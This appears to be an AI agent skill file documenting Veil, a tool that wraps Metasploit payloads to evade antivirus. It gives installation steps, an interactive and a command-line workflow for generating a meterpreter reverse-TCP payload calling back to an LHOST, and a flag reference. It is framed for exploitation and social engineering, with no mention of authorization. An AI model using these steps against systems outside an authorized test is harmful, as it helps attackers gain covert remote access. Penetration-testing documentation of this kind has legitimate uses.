---
name: veil
description: Generate metasploit payloads designed to bypass common anti-virus solutions. Use when performing exploitation, social engineering, or post-exploitation tasks where antivirus evasion is required to maintain access or execute malicious code on a target system.
---

# veil

## Overview
Veil is a framework designed to generate executable payloads that bypass common anti-virus (AV) solutions. It primarily focuses on obfuscating Metasploit payloads but supports various languages and delivery methods. Category: Exploitation / Post-Exploitation / Social Engineering.

## Installation (if not already installed)

Assume Veil is already installed. If you encounter errors or the tool is missing, use:

```bash
sudo apt update
sudo apt install veil
```

After installation, the tool often requires a setup process to configure its Wine environment and dependencies:
```bash
/usr/share/veil/config/setup.sh --force --silent
```

## Common Workflows

### Launching the Interactive Menu
Veil is primarily an interactive tool. Start the main menu to select tools (Evasion or Ordnance):
```bash
veil
```

### Generating an Evasive Payload (Interactive)
1. Run `veil`.
2. Enter `use 1` (Evasion).
3. Enter `list` to see available payloads.
4. Enter `use <number>` (e.g., `use ruby/meterpreter/rev_tcp.py`).
5. Set options: `set LHOST 192.168.1.10`.
6. Enter `generate` to create the executable.

### Using Command Line Arguments (Non-interactive)
Generate a payload directly without navigating menus:
```bash
veil -t Evasion -p python/meterpreter/rev_tcp.py --ip 192.168.1.10 --port 4444
```

## Complete Command Reference

### Global Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-v`, `--version` | Display the version of Veil |
| `--update` | Update the Veil framework |
| `--setup` | Run the Veil setup script to install dependencies |

### Tool Selection

| Flag | Description |
|------|-------------|
| `-t <tool>`, `--tool <tool>` | Specify the tool to use (Evasion or Ordnance) |
| `-p <payload>`, `--payload <payload>` | Specify the payload to use |
| `--list` | List available payloads for the selected tool |

### Payload Configuration

| Flag | Description |
|------|-------------|
| `--ip <IP>` | Set the LHOST IP address for the payload |
| `--port <Port>` | Set the LPORT for the payload |
| `--options` | List options for a specific payload |
| `--set <VAR=VAL>` | Set a specific payload option (e.g., `--set COMPILE_TO_EXE=Y`) |

### Output Options

| Flag | Description |
|------|-------------|
| `-o <name>`, `--output <name>` | Specify the base name for the output files |
| `--outdir <dir>` | Specify the directory to save the generated output |

## Notes
- **Wine Environment**: Veil relies heavily on Wine to compile Windows executables. Ensure the Wine environment is properly initialized via the setup script if generation fails.
- **Output Location**: By default, generated payloads are stored in `/var/lib/veil/output/compiled/`.
- **Dependencies**: Requires `metasploit-framework` for payload generation and `mingw-w64` for cross-compilation.
- **AV Evasion**: No payload is guaranteed to be FUD (Fully Undetectable) forever. Always test against updated signatures in a lab environment.